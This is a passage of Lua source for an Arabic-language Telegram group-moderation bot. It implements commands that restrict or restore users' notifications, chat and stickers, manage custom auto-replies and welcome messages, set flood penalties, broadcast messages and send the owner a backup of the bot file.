if text == 'فتح الاشعارات' and tonumber(msg.reply_to_message_id_) > 0 and is_mod(msg) then   function kick_by_reply(extra, result, success)   tahadevstorm:del('numlocktgser'..msg.chat_id_..result.sender_user_id_)  tahadevstorm:srem(DEVSTOR..'locktgser:ban'..msg.chat_id_,result.sender_user_id_)     zo = '*◗💢¦* العضــو [ '..get_username(result.sender_user_id_)..' ]\n*◗🚸¦ الايــدي { '..result.sender_user_id_..' }*\n*◗📛¦* تـم الغـاء منـعه مـن الاشعارات'  storm_sendMsg(msg.chat_id_, msg.id_, 1, zo, 1, "md")     end  getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),kick_by_reply)   end  if text and text:match('^فتح الاشعارات (%d+)') and is_mod(msg)  then   local user = text:match('فتح الاشعارات (%d+)')    function bot_kick(extra, result, success) username = ''..(result.username_ or ' لم يضع معرف ✨')..''  tahadevstorm:del('numlocktgser'..msg.chat_id_..user)  tahadevstorm:srem(DEVSTOR..'locktgser:ban'..msg.chat_id_,user)     zo = '*◗💢¦* العضــو [ @'..username..' ]\n*◗🚸¦ الايــدي { '..user..' }*\n*◗📛¦* تـم الغـاء منـعه مـن الاشعارات'  storm_sendMsg(msg.chat_id_, msg.id_, 1, zo, 1, "md")    end  getUser(user, bot_kick)  end
if text and text:match('^فتح الاشعارات @(.*)') and is_mod(msg) then   local username = text:match('فتح الاشعارات @(.*)')   function kick_username(extra,result,success)   if result.id_ then    tahadevstorm:del('numlocktgser'..msg.chat_id_..result.id_)  tahadevstorm:srem(DEVSTOR..'locktgser:ban'..msg.chat_id_,result.id_)     zo = '*◗💢¦* العضــو [ @'..username..' ]\n*◗🚸¦ الايــدي { '..result.id_..' }*\n*◗📛¦* تـم الغـاء منـعه مـن الاشعارات'  storm_sendMsg(msg.chat_id_, msg.id_, 1, zo, 1, "md")    end    end   saddbyusername(username,kick_username)   end
if text == 'قفل الدردشه' and tonumber(msg.reply_to_message_id_) > 0 and is_mod(msg) then   function kick_by_reply(extra, result, success)   if not msg.can_be_deleted_ == true then   storm_sendMsg(msg.chat_id_, msg.id_, 1, "*◗🚨¦* يرجى ترقيتي ادمن هنا ◖🍃\n", 1, "md")   else   if tonumber(result.sender_user_id_) == tonumber(bot_id) then    storm_sendMsg(msg.chat_id_, msg.id_, 1, '*◗🚨¦ عذرا لا تستطيع حظر او كتم او طرد او تقيد البوت 💢*', 1, 'md')    return false  end   if storm3(msg.chat_id_,result.sender_user_id_) then   storm_sendMsg(msg.chat_id_, msg.id_, 1, '*◗🚨¦ عذرآ لا تستطيع منع الارسال من ال(مدراء و المنشئين) 💢*', 1, 'md')  return false  end    tahadevstorm:incrby('numlocktextus'..msg.chat_id_..result.sender_user_id_,160000066)  tahadevstorm:sadd(DEVSTOR..'locktextus:ban'..msg.chat_id_,result.sender_user_id_)     zo = '*◗💢¦* العضــو [ '..get_username(result.sender_user_id_)..' ]\n*◗🚸¦ الايــدي { '..result.sender_user_id_..' }*\n*◗📛¦* تـم منعـه مـن ارســال الدردشه'  storm_sendMsg(msg.chat_id_, msg.id_, 1, zo, 1, "md")   end  end getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),kick_by_reply)   end
if text and text:match('^قفل الدردشه (%d+)') and is_mod(msg)  then   local user = text:match('قفل الدردشه (%d+)')    function bot_kick(extra, result, success) username = ''..(result.username_ or ' لم يضع معرف ✨')..''  if not msg.can_be_deleted_ == true then   storm_sendMsg(msg.chat_id_, msg.id_, 1, "*🚨¦* تنبيــه انا لست ادمن يرجى ترقيتي ادمن هنا 👮\n", 1, "md")   else   if tonumber(user) == tonumber(bot_id) then    storm_sendMsg(msg.chat_id_, msg.id_, 1, '*◗🚨¦ عذرا لا تستطيع حظر او كتم او طرد او تقيد البوت 💢*', 1, 'md')    return false  end   if storm3(msg.chat_id_,user) then   storm_sendMsg(msg.chat_id_, msg.id_, 1, '*◗🚨¦ عذرآ لا تستطيع منع الارسال من ال(مدراء و المنشئين) 💢*', 1, 'md')   return false  end     tahadevstorm:incrby('numlocktextus'..msg.chat_id_..user,10000000)  tahadevstorm:sadd(DEVSTOR..'locktextus:ban'..msg.chat_id_,user)     zo = '*◗💢¦* العضــو [ @'..username..' ]\n*◗🚸¦ الايــدي { '..user..' }*\n*◗📛¦* تـم منعـه مـن ارســال الدردشه'  storm_sendMsg(msg.chat_id_, msg.id_, 1, zo, 1, "md")   end end getUser(user, bot_kick) end
if text and text:match('^قفل الدردشه @(.*)') and is_mod(msg) then   local username = text:match('قفل الدردشه @(.*)')   function kick_username(extra,result,success)   if result.id_ then    if tonumber(result.id_) == tonumber(bot_id) then    storm_sendMsg(msg.chat_id_, msg.id_, 1, '*◗🚨¦ عذرا لا تستطيع حظر او كتم او طرد او تقيد البوت 💢*', 1, 'md')    return false  end   if storm3(msg.chat_id_,result.id_) then   storm_sendMsg(msg.chat_id_, msg.id_, 1, '*◗🚨¦ عذرآ لا تستطيع منع الارسال من ال(مدراء و المنشئين) 💢*', 1, 'md')   else   if not msg.can_be_deleted_ == true then   storm_sendMsg(msg.chat_id_, msg.id_, 1, "*🚨¦* تنبيــه انا لست ادمن يرجى ترقيتي ادمن هنا 👮\n", 1, "md")   else   tahadevstorm:incrby('numlocktextus'..msg.chat_id_..result.id_,160000066)  tahadevstorm:sadd(DEVSTOR..'locktextus:ban'..msg.chat_id_,result.id_)     zo = '*◗💢¦* العضــو [ @'..username..' ]\n*◗🚸¦ الايــدي { '..result.id_..' }*\n*◗📛¦* تـم منعـه مـن ارســال الدردشه'  storm_sendMsg(msg.chat_id_, msg.id_, 1, zo, 1, "md")   end end end end   saddbyusername(username,kick_username)   end  
if text == 'فتح الدردشه' and tonumber(msg.reply_to_message_id_) > 0 and is_mod(msg) then   function kick_by_reply(extra, result, success)   tahadevstorm:del('numlocktextus'..msg.chat_id_..result.sender_user_id_)  tahadevstorm:srem(DEVSTOR..'locktextus:ban'..msg.chat_id_,result.sender_user_id_)     zo = '*◗💢¦* العضــو [ '..get_username(result.sender_user_id_)..' ]\n*◗🚸¦ الايــدي { '..result.sender_user_id_..' }*\n*◗📛¦* تـم الغـاء منـعه مـن الدردشه'  storm_sendMsg(msg.chat_id_, msg.id_, 1, zo, 1, "md")     end  getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),kick_by_reply)   end
if text and text:match('^فتح الدردشه (%d+)') and is_mod(msg)  then   local user = text:match('فتح الدردشه (%d+)')    function bot_kick(extra, result, success) username = ''..(result.username_ or ' لم يضع معرف ✨')..''    tahadevstorm:del('numlocktextus'..msg.chat_id_..user)  tahadevstorm:srem(DEVSTOR..'locktextus:ban'..msg.chat_id_,user)     zo = '*◗💢¦* العضــو [ @'..username..' ]\n*◗🚸¦ الايــدي { '..user..' }*\n*◗📛¦* تـم الغـاء منـعه مـن الدردشه'  storm_sendMsg(msg.chat_id_, msg.id_, 1, zo, 1, "md")   end   getUser(user, bot_kick)  end
if text and text:match('^فتح الدردشه @(.*)') and is_mod(msg) then   local username = text:match('فتح الدردشه @(.*)')   function kick_username(extra,result,success)   if result.id_ then    tahadevstorm:del('numlocktextus'..msg.chat_id_..result.id_)  tahadevstorm:srem(DEVSTOR..'locktextus:ban'..msg.chat_id_,result.id_)     zo = '*◗💢¦* العضــو [ @'..username..' ]\n*◗🚸¦ الايــدي { '..result.id_..' }*\n*◗📛¦* تـم الغـاء منـعه مـن الدردشه'  storm_sendMsg(msg.chat_id_, msg.id_, 1, zo, 1, "md")    end    end   saddbyusername(username,kick_username)   end
if text == 'قفل الملصقات' and tonumber(msg.reply_to_message_id_) > 0 and is_mod(msg) then   function kick_by_reply(extra, result, success)   if not msg.can_be_deleted_ == true then   storm_sendMsg(msg.chat_id_, msg.id_, 1, "*◗🚨¦* يرجى ترقيتي ادمن هنا ◖🍃\n", 1, "md")   else   if tonumber(result.sender_user_id_) == tonumber(bot_id) then    storm_sendMsg(msg.chat_id_, msg.id_, 1, '*◗🚨¦ عذرا لا تستطيع حظر او كتم او طرد او تقيد البوت 💢*', 1, 'md')    return false  end   if storm3(msg.chat_id_,result.sender_user_id_) then   storm_sendMsg(msg.chat_id_, msg.id_, 1, '*◗🚨¦ عذرآ لا تستطيع منع الارسال من ال(مدراء و المنشئين) 💢*', 1, 'md')  return false  end    tahadevstorm:incrby('numlockste'..msg.chat_id_..result.sender_user_id_,160000066)  tahadevstorm:sadd(DEVSTOR..'lockste:ban'..msg.chat_id_,result.sender_user_id_)     zo = '*◗💢¦* العضــو [ '..get_username(result.sender_user_id_)..' ]\n*◗🚸¦ الايــدي { '..result.sender_user_id_..' }*\n*◗📛¦* تـم منعـه مـن ارســال الملصقات'  storm_sendMsg(msg.chat_id_, msg.id_, 1, zo, 1, "md")   end  end getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),kick_by_reply)   end
if text and text:match('^قفل الملصقات (%d+)') and is_mod(msg)  then   local user = text:match('قفل الملصقات (%d+)')    function bot_kick(extra, result, success) username = ''..(result.username_ or ' لم يضع معرف ✨')..''  if not msg.can_be_deleted_ == true then   storm_sendMsg(msg.chat_id_, msg.id_, 1, "*🚨¦* تنبيــه انا لست ادمن يرجى ترقيتي ادمن هنا 👮\n", 1, "md")   else   if tonumber(user) == tonumber(bot_id) then    storm_sendMsg(msg.chat_id_, msg.id_, 1, '*◗🚨¦ عذرا لا تستطيع حظر او كتم او طرد او تقيد البوت 💢*', 1, 'md')    return false  end   if storm3(msg.chat_id_,user) then   storm_sendMsg(msg.chat_id_, msg.id_, 1, '*◗🚨¦ عذرآ لا تستطيع منع الارسال من ال(مدراء و المنشئين) 💢*', 1, 'md')   return false  end     tahadevstorm:incrby('numlockste'..msg.chat_id_..user,10000000)  tahadevstorm:sadd(DEVSTOR..'lockste:ban'..msg.chat_id_,user)     zo = '*◗💢¦* العضــو [ @'..username..' ]\n*◗🚸¦ الايــدي { '..user..' }*\n*◗📛¦* تـم منعـه مـن ارســال الملصقات'  storm_sendMsg(msg.chat_id_, msg.id_, 1, zo, 1, "md")   end end getUser(user, bot_kick) end
if text and text:match('^قفل الملصقات @(.*)') and is_mod(msg) then   local username = text:match('قفل الملصقات @(.*)')   function kick_username(extra,result,success)   if result.id_ then    if tonumber(result.id_) == tonumber(bot_id) then    storm_sendMsg(msg.chat_id_, msg.id_, 1, '*◗🚨¦ عذرا لا تستطيع حظر او كتم او طرد او تقيد البوت 💢*', 1, 'md')    return false  end   if storm3(msg.chat_id_,result.id_) then   storm_sendMsg(msg.chat_id_, msg.id_, 1, '*◗🚨¦ عذرآ لا تستطيع منع الارسال من ال(مدراء و المنشئين) 💢*', 1, 'md')   else   if not msg.can_be_deleted_ == true then   storm_sendMsg(msg.chat_id_, msg.id_, 1, "*🚨¦* تنبيــه انا لست ادمن يرجى ترقيتي ادمن هنا 👮\n", 1, "md")   else   tahadevstorm:incrby('numlockste'..msg.chat_id_..result.id_,160000066)  tahadevstorm:sadd(DEVSTOR..'lockste:ban'..msg.chat_id_,result.id_)     zo = '*◗💢¦* العضــو [ @'..username..' ]\n*◗🚸¦ الايــدي { '..result.id_..' }*\n*◗📛¦* تـم منعـه مـن ارســال الملصقات'  storm_sendMsg(msg.chat_id_, msg.id_, 1, zo, 1, "md")   end end end end   saddbyusername(username,kick_username)   end
if text == 'فتح الملصقات' and tonumber(msg.reply_to_message_id_) > 0 and is_mod(msg) then   function kick_by_reply(extra, result, success)   tahadevstorm:del('numlockste'..msg.chat_id_..result.sender_user_id_)  tahadevstorm:srem(DEVSTOR..'lockste:ban'..msg.chat_id_,result.sender_user_id_)     zo = '*◗💢¦* العضــو [ '..get_username(result.sender_user_id_)..' ]\n*◗🚸¦ الايــدي { '..result.sender_user_id_..' }*\n*◗📛¦* تـم الغـاء منـعه مـن الملصقات'  storm_sendMsg(msg.chat_id_, msg.id_, 1, zo, 1, "md")   end    getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),kick_by_reply)   end
if text and text:match('^فتح الملصقات (%d+)') and is_mod(msg)  then   local user = text:match('فتح الملصقات (%d+)')    function bot_kick(extra, result, success) username = ''..(result.username_ or ' لم يضع معرف ✨')..''  tahadevstorm:del('numlocksteste'..msg.chat_id_..user)  tahadevstorm:srem(DEVSTOR..'lockste:ban'..msg.chat_id_,user)     zo = '*◗💢¦* العضــو [ @'..username..' ]\n*◗🚸¦ الايــدي { '..user..' }*\n*◗📛¦* تـم الغـاء منـعه مـن الملصقات'  storm_sendMsg(msg.chat_id_, msg.id_, 1, zo, 1, "md")   end  getUser(user, bot_kick)  end
if text and text:match('^فتح الملصقات @(.*)') and is_mod(msg) then   local username = text:match('فتح الملصقات @(.*)')   function kick_username(extra,result,success)   if result.id_ then    tahadevstorm:del('numlockste'..msg.chat_id_..result.id_)  tahadevstorm:srem(DEVSTOR..'lockste:ban'..msg.chat_id_,result.id_)     zo = '*◗💢¦* العضــو [ @'..username..' ]\n*◗🚸¦ الايــدي { '..result.id_..' }*\n*◗📛¦* تـم الغـاء منـعه مـن الملصقات'  storm_sendMsg(msg.chat_id_, msg.id_, 1, zo, 1, "md")    end    end   saddbyusername(username,kick_username)   end end 
if text and text == 'تغير كليشه الترحيب' and is_devtaha(msg)  then    storm_sendMsg(msg.chat_id_, msg.id_, 1, '*🚸¦ حسنآ ارسل لي نص الترحيب *\n', 1, 'md')   tahadevstorm:set("addreply1:"..msg.sender_user_id_..bot_id,"rep")   return false   end     if text then    local rep = tahadevstorm:get("addreply1:"..msg.sender_user_id_..bot_id)   if rep == 'rep' then    storm_sendMsg(msg.chat_id_, msg.id_, 1, "*📷¦ ارسل لي صورة الترحيب *\n", 1, 'md')   tahadevstorm:set("addreply1:"..msg.sender_user_id_..bot_id,"repp")   tahadevstorm:set("addreply2:"..msg.sender_user_id_..bot_id, text)   tahadevstorm:set("klish:welc"..bot_id,text)   return false   end   end   if data.message_.content_.photo_ or data.message_.content_.animation_ then   local test = tahadevstorm:get("addreply1:"..msg.sender_user_id_..bot_id)   if test == 'repp' then   storm_sendMsg(msg.chat_id_, msg.id_, 1, "*📬¦ تم تغير كليشه الترحيب 💯*\n", 1, 'md')   tahadevstorm:del("addreply1:"..msg.sender_user_id_..bot_id)   local test = tahadevstorm:get("addreply2:"..msg.sender_user_id_..bot_id)   if data.message_.content_.photo_ then   if data.message_.content_.photo_.sizes_[1] then   tahadevstorm:set("addreply1photo1"..bot_id, data.message_.content_.photo_.sizes_[1].photo_.persistent_id_)   end end   if data.message_.content_.animation_ then    tahadevstorm:set("addreply1:gif"..bot_id, data.message_.content_.animation_.animation_.persistent_id_)   tahadevstorm:del("addreply1photo1"..bot_id)   end   tahadevstorm:del("addreply2:"..msg.sender_user_id_..bot_id)   return false   end   end
if msg.content_.ID == "MessageChatAddMembers" then   for i=0,#msg.content_.members_ do    addbotgrop = msg.content_.members_[i].id_    if addbotgrop and addbotgrop == tonumber(bot_id) then  local photo = tahadevstorm:get("addreply1photo1"..bot_id)   if photo then  local klishwelc = tahadevstorm:get("klish:welc"..bot_id)  print(title_name(msg.chat_id_)) sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, photo,klishwelc)     else   local gif = tahadevstorm:get("addreply1:gif"..bot_id)   local klishwelc = tahadevstorm:get("klish:welc"..bot_id)      storm_sendMsg(msg.chat_id_, msg.id_, 1, '*◗🚨¦ مرحبا صديقي انا بوت حمايه ،\n◗🛠¦ يمڪنني حمايه مجموعتڬ ،\n◗👨🏼‍✈️¦ ارفعني ڪمشرف في المجموعه ،\n◗📛¦ ۅمن بعدها يتم تفعيل المجموعه ،\n◗🎲¦ ويتم رفع الادمنيه والمدير تلقائيا*\n', 1, 'md')   end end   end end
if tahadevstorm:get(DEVSTOR.."add:bot:group"..msg.chat_id_)  then
if text == "مسح ردود بالرد" and is_monsh(msg) then  local list = tahadevstorm:smembers("rep:media"..msg.chat_id_)  local taha = tahadevstorm:scard("rep:media"..msg.chat_id_)  for k,v in pairs(list) do  tahadevstorm:del(DEVSTOR.."addreply1:"..msg.sender_user_id_..msg.chat_id_)  tahadevstorm:del(DEVSTOR.."addreply1:gif"..v..msg.chat_id_)  tahadevstorm:del(DEVSTOR.."addreply1:vico"..v..msg.chat_id_)  tahadevstorm:del(DEVSTOR.."addreply1:stekr"..v..msg.chat_id_)  tahadevstorm:del(DEVSTOR.."taha:"..v..msg.chat_id_)  tahadevstorm:srem("rep:media"..msg.chat_id_,v)  end  storm_sendMsg(msg.chat_id_, msg.id_, 1, "*📛¦* المجموعه تحتوي على *{"..taha.."}* رد \n*📮¦* تم مسح الردود جميعها \n", 1, 'md')  end
if  text == "قائمه ردود بالرد" and is_monsh(msg) then  local list = tahadevstorm:smembers("rep:media"..msg.chat_id_)  t = "*🚨¦* قائمه الردود بالرد 📊\n*━━━━━━━━━━━━*\n"  for k,v in pairs(list) do  t = t..'*◗'..k..'◖ { * `'..v..'` *}*\n'  end  if #list == 0 then  t = "*📬¦* لا يوجد ردود مضافه"  end  storm_sendMsg(msg.chat_id_, msg.id_, 1, t, 1, 'md')  end  if text and text == 'اضف رد بالرد' and is_mod(msg)  then   storm_sendMsg(msg.chat_id_, msg.id_, 1, '*🚨¦* ارسل الكلمه الان ✨\n', 1, 'md')  tahadevstorm:set(DEVSTOR.."addreply1:"..msg.sender_user_id_..msg.chat_id_,"rep")  return false  end    if text then   local tsssst = tahadevstorm:get(DEVSTOR.."addreply1:"..msg.sender_user_id_..msg.chat_id_)  if tsssst == 'rep' then   storm_sendMsg(msg.chat_id_, msg.id_, 1, "*🚨¦*  ارسل لي الرد الان \n*📛¦* تستطيع ◗نص ، ملصق ، متحركه ، صوت◖\n", 1, 'md')  tahadevstorm:set(DEVSTOR.."addreply1:"..msg.sender_user_id_..msg.chat_id_,"repp")  tahadevstorm:set(DEVSTOR.."addreply2:"..msg.sender_user_id_..msg.chat_id_, text)  tahadevstorm:sadd("rep:media"..msg.chat_id_,text)  return false  end  end  
if (text and text == 'حذف رد بالرد' and  is_monsh(msg) ) then   storm_sendMsg(msg.chat_id_, msg.id_, 1, '*🚨¦*  ارسل لي الكلمه الان \n', 1, 'md')  tahadevstorm:set(DEVSTOR.."addreply1:"..msg.sender_user_id_..msg.chat_id_,"reppp")  return false  end
if text == "مسح الردود" and is_monsh(msg) then  local list = tahadevstorm:smembers("repmedia"..msg.chat_id_)  local taha = tahadevstorm:scard("repmedia"..msg.chat_id_)  for k,v in pairs(list) do  tahadevstorm:del(DEVSTOR.."add:reply1"..msg.sender_user_id_..msg.chat_id_)  tahadevstorm:del(DEVSTOR.."add:reply1:gif"..v..msg.chat_id_)  tahadevstorm:del(DEVSTOR.."add:reply1:vico"..v..msg.chat_id_)  tahadevstorm:del(DEVSTOR.."add:reply1:stekr"..v..msg.chat_id_)  tahadevstorm:del(DEVSTOR.."add:reply:rd"..v..msg.chat_id_)  tahadevstorm:srem("repmedia"..msg.chat_id_,v)  end  storm_sendMsg(msg.chat_id_, msg.id_, 1, "*📛¦* المجموعه تحتوي على *{"..taha.."}* رد \n*📮¦* تم مسح الردود جميعها \n", 1, 'md')  end
if  text == "قائمه الردود" and is_monsh(msg) then  local list = tahadevstorm:smembers("repmedia"..msg.chat_id_)  t = "*🚨¦* قائمه الردود 📊\n*━━━━━━━━━━━━*\n"  for k,v in pairs(list) do  t = t..'*◗'..k..'◖ { * `'..v..'` *}*\n'  end  if #list == 0 then  t = "*📬¦* لا يوجد ردود مضافه"  end  storm_sendMsg(msg.chat_id_, msg.id_, 1, t, 1, 'md')  end  if text and text == 'اضف رد' and is_monsh(msg)  then   storm_sendMsg(msg.chat_id_, msg.id_, 1, '*🚨¦* ارسل الكلمه الان ✨\n', 1, 'md')  tahadevstorm:set(DEVSTOR.."add:reply1"..msg.sender_user_id_..msg.chat_id_,"rep")  return false  end    if text then   local tsssst = tahadevstorm:get(DEVSTOR.."add:reply1"..msg.sender_user_id_..msg.chat_id_)  if tsssst == 'rep' then   storm_sendMsg(msg.chat_id_, msg.id_, 1, "*🚨¦*  ارسل لي الرد الان \n*📛¦* تستطيع ◗نص ، ملصق ، متحركه ، صوت◖\n", 1, 'md')  tahadevstorm:set(DEVSTOR.."add:reply1"..msg.sender_user_id_..msg.chat_id_,"repp")  tahadevstorm:set(DEVSTOR.."add:reply2"..msg.sender_user_id_..msg.chat_id_, text)  tahadevstorm:sadd("repmedia"..msg.chat_id_,text)  return false  end  end
if (text and text == 'حذف رد' and  is_monsh(msg) ) then   storm_sendMsg(msg.chat_id_, msg.id_, 1, '*🚨¦*  ارسل لي الكلمه الان \n', 1, 'md')  tahadevstorm:set(DEVSTOR.."add:reply1"..msg.sender_user_id_..msg.chat_id_,"reppp")  return false  end
if text == 'تفعيل ردود المطور بالرد' and is_devtaha(msg) then   taha = '◗*📛¦*تم تفعيل ردود المطور  ✔' storm_sendMsg( msg.chat_id_, msg.id_, 1, taha, 1, "md") tahadevstorm:del(DEVSTOR..'lock:rep:all:rd'..bot_id)   end
if text == 'تعطيل ردود المطور بالرد' and is_devtaha(msg) then  taha = '◗*📛¦*تم تعطيل ردود المطور  ❌' storm_sendMsg( msg.chat_id_, msg.id_, 1, taha, 1, "md") tahadevstorm:set(DEVSTOR..'lock:rep:all:rd'..bot_id,true)   end
if text == "مسح ردود المطور بالرد" and is_devtaha(msg) then    local list = tahadevstorm:smembers("rep:media:all:rd"..bot_id)    local taha = tahadevstorm:scard("rep:media:all:rd"..bot_id)    for k,v in pairs(list) do    tahadevstorm:del(DEVSTOR.."add:repallt:rd"..msg.sender_user_id_..bot_id)    tahadevstorm:del(DEVSTOR.."add:repallt:gif:all:rd"..v..bot_id)    tahadevstorm:del(DEVSTOR.."add:rep:tvico:all:rd"..v..bot_id)    tahadevstorm:del(DEVSTOR.."add:rep:tstekr:all:rd"..v..bot_id)    tahadevstorm:del(DEVSTOR.."add:rep:text:all:rd"..v..bot_id)    tahadevstorm:srem("rep:media:all:rd"..bot_id,v)    end    storm_sendMsg(msg.chat_id_, msg.id_, 1, "*📛¦* المجموعه تحتوي على *{"..taha.."}* رد \n*📮¦* تم مسح الردود جميعها \n", 1, 'md')    end
if  text == "ردود المطور بالرد" and is_devtaha(msg) then    local list = tahadevstorm:smembers("rep:media:all:rd"..bot_id)    t = "*🚨¦* قائمه الردود المطور 📊\n*━━━━━━━━━━━━*\n"    for k,v in pairs(list) do    t = t..'*◗'..k..'◖ { * `'..v..'` *}*\n'    end    if #list == 0 then    t = "*📬¦* لا يوجد ردود مضافه"    end    storm_sendMsg(msg.chat_id_, msg.id_, 1, t, 1, 'md')    end
if text and text == 'اضف رد بالرد للكل' and is_devtaha(msg)  then     storm_sendMsg(msg.chat_id_, msg.id_, 1, '*🚨¦* ارسل الكلمه الان ✨\n', 1, 'md')    tahadevstorm:set(DEVSTOR.."add:repallt:rd"..msg.sender_user_id_..bot_id,'yes')    return false    end      if text then     local tt = tahadevstorm:get(DEVSTOR.."add:repallt:rd"..msg.sender_user_id_..bot_id)    if tt == 'yes' then     storm_sendMsg(msg.chat_id_, msg.id_, 1, "*🚨¦*  ارسل لي الرد الان \n*📛¦* تستطيع ◗نص ، ملصق ، متحركه ، صوت◖\n", 1, 'md')    tahadevstorm:set(DEVSTOR.."add:repallt:rd"..msg.sender_user_id_..bot_id,'yes1')    tahadevstorm:set(DEVSTOR.."addreply2:"..msg.sender_user_id_..bot_id, text)    tahadevstorm:sadd("rep:media:all:rd"..bot_id,text)    return false    end    end
if text and text == 'حذف رد بالرد للكل' and  is_devtaha(msg) then     storm_sendMsg(msg.chat_id_, msg.id_, 1, '*🚨¦*  ارسل لي الكلمه الان \n', 1, 'md')    tahadevstorm:set(DEVSTOR.."add:repallt:rd"..msg.sender_user_id_..bot_id,'yes11')    return false    end    
if text == 'تفعيل ردود المطور' and is_devtaha(msg) then   taha = '◗*📛¦*تم تفعيل ردود المطور  ✔' storm_sendMsg( msg.chat_id_, msg.id_, 1, taha, 1, "md") tahadevstorm:del(DEVSTOR..'lock:rep:all'..bot_id)   end
if text == 'تعطيل ردود المطور' and is_devtaha(msg) then  taha = '◗*📛¦*تم تعطيل ردود المطور  ❌' storm_sendMsg( msg.chat_id_, msg.id_, 1, taha, 1, "md") tahadevstorm:set(DEVSTOR..'lock:rep:all'..bot_id,true)   end
if text == "مسح ردود المطور" and is_devtaha(msg) then    local list = tahadevstorm:smembers("rep:media:all"..bot_id)    local taha = tahadevstorm:scard("rep:media:all"..bot_id)    for k,v in pairs(list) do    tahadevstorm:del(DEVSTOR.."add:repallt"..msg.sender_user_id_..bot_id)    tahadevstorm:del(DEVSTOR.."add:repallt:gif:all"..v..bot_id)    tahadevstorm:del(DEVSTOR.."add:rep:tvico:all"..v..bot_id)    tahadevstorm:del(DEVSTOR.."add:rep:tstekr:all"..v..bot_id)    tahadevstorm:del(DEVSTOR.."add:rep:text:all"..v..bot_id)    tahadevstorm:srem("rep:media:all"..bot_id,v)    end    storm_sendMsg(msg.chat_id_, msg.id_, 1, "*📛¦* المجموعه تحتوي على *{"..taha.."}* رد \n*📮¦* تم مسح الردود جميعها \n", 1, 'md')    end
if  text == "ردود المطور" and is_devtaha(msg) then    local list = tahadevstorm:smembers("rep:media:all"..bot_id)    t = "*🚨¦* قائمه الردود المطور 📊\n*━━━━━━━━━━━━*\n"    for k,v in pairs(list) do    t = t..'*◗'..k..'◖ { * `'..v..'` *}*\n'    end    if #list == 0 then    t = "*📬¦* لا يوجد ردود مضافه"    end    storm_sendMsg(msg.chat_id_, msg.id_, 1, t, 1, 'md')    end
if text and text == 'اضف رد للكل' and is_devtaha(msg)  then     storm_sendMsg(msg.chat_id_, msg.id_, 1, '*🚨¦* ارسل الكلمه الان ✨\n', 1, 'md')    tahadevstorm:set(DEVSTOR.."add:repallt"..msg.sender_user_id_..bot_id,'yes')    return false    end      if text then     local tt = tahadevstorm:get(DEVSTOR.."add:repallt"..msg.sender_user_id_..bot_id)    if tt == 'yes' then     storm_sendMsg(msg.chat_id_, msg.id_, 1, "*🚨¦*  ارسل لي الرد الان \n*📛¦* تستطيع ◗نص ، ملصق ، متحركه ، صوت◖\n", 1, 'md')    tahadevstorm:set(DEVSTOR.."add:repallt"..msg.sender_user_id_..bot_id,'yes1')    tahadevstorm:set(DEVSTOR.."addreply2:"..msg.sender_user_id_..bot_id, text)    tahadevstorm:sadd("rep:media:all"..bot_id,text)    return false    end    end
if text and text == 'حذف رد للكل' and  is_devtaha(msg) then     storm_sendMsg(msg.chat_id_, msg.id_, 1, '*🚨¦*  ارسل لي الكلمه الان \n', 1, 'md')    tahadevstorm:set(DEVSTOR.."add:repallt"..msg.sender_user_id_..bot_id,'yes11')    return false    end    
if text ==('ايديي') then   storm_sendMsg(msg.chat_id_, msg.id_, 1,'◖`'..msg.sender_user_id_..'`◗', 1, 'md')   end
if text == "وضع اسم البوت" and is_devtaha(msg) then tahadevstorm:setex(DEVSTOR..'namebot:witting'..msg.sender_user_id_,300,true) storm_sendMsg(msg.chat_id_, msg.id_, 1, "*📛¦* ارسل لي الاسم 📯\n",1, 'md')  end
if text == 'طرد البوتات' and is_monsh(msg) then   local function cb(extra,result,success)  local bots = result.members_   for i=0 , #bots do    kick(msg,msg.chat_id_,bots[i].user_id_) end   end  chek_bots(msg.chat_id_,cb)  end   if text and is_owner(msg) then
if text == 'قفل التكرار بالطرد' then tahadevstorm:hset("flooding:settings:"..msg.chat_id_ ,"flood",'kick')  storm_sendMsg(msg.chat_id_, msg.id_, 1, '💥*¦*  تم قفل التكرار بالطرد',1, 'md')
elseif text == 'قفل التكرار بالحظر' then tahadevstorm:hset("flooding:settings:"..msg.chat_id_ ,"flood",'ban')  storm_sendMsg(msg.chat_id_, msg.id_, 1, '💥*¦*  تم قفل التكرار بالحظر',1, 'md')
elseif text == 'قفل التكرار بالكتم' then tahadevstorm:hset("flooding:settings:"..msg.chat_id_ ,"flood",'mute')  storm_sendMsg(msg.chat_id_, msg.id_, 1, '💥*¦*  تم قفل التكرار بالكتم',1, 'md')
elseif text == 'فتح التكرار' then tahadevstorm:hdel("flooding:settings:"..msg.chat_id_ ,"flood")  storm_sendMsg(msg.chat_id_, msg.id_, 1, '💥*¦*  تم فتح التكرار',1, 'md') end end end
if text and text:match("^(اذاعه) (-%d+) (.*)") and is_devtaha(msg) then local matches = {text:match("^(اذاعه) (-%d+) (.*)")} if #matches == 3 then storm_sendMsg((matches[2]), 0, 1, matches[3], 1, "html")   storm_sendMsg(msg.chat_id_, msg.id_, 1, '📮 ❯❯ تم ارسال رسالتك الى \n'..matches[2]..' 🍃', 1, 'md')  end end
if msg.chat_id_ then local id = tostring(msg.chat_id_) if id:match('-100(%d+)') then tahadevstorm:incr(DEVSTOR..'sgpsmessage:') if not tahadevstorm:sismember("botgps",msg.chat_id_) then   tahadevstorm:sadd(DEVSTOR.."botgps",msg.chat_id_) end elseif id:match('^(%d+)') then tahadevstorm:incr(DEVSTOR..'pvmessage:') if not tahadevstorm:sismember("usersbot",msg.chat_id_) then tahadevstorm:sadd(DEVSTOR.."usersbot",msg.chat_id_) end else tahadevstorm:incr(DEVSTOR..'gpsmessage:') if not tahadevstorm:sismember("botgp",msg.chat_id_) then tahadevstorm:sadd(DEVSTOR.."botgp",msg.chat_id_)  end end end if text then if is_devtaha(msg) then
if text == 'ارسال نسخه' and is_devtaha(msg) then  sendDocument(SUDO, 0, 0, 1, nil, './STORM.lua', '🚸¦اسم الملف ( STORM.lua )\n♻¦عدد المشتركين ( '..(tahadevstorm:scard(DEVSTOR.."usersbot") or 0)..' )\n📮¦عدد المجموعات ( '..(tahadevstorm:scard(DEVSTOR.."botgps") or 0)..' )',dl_cb, nil)  end
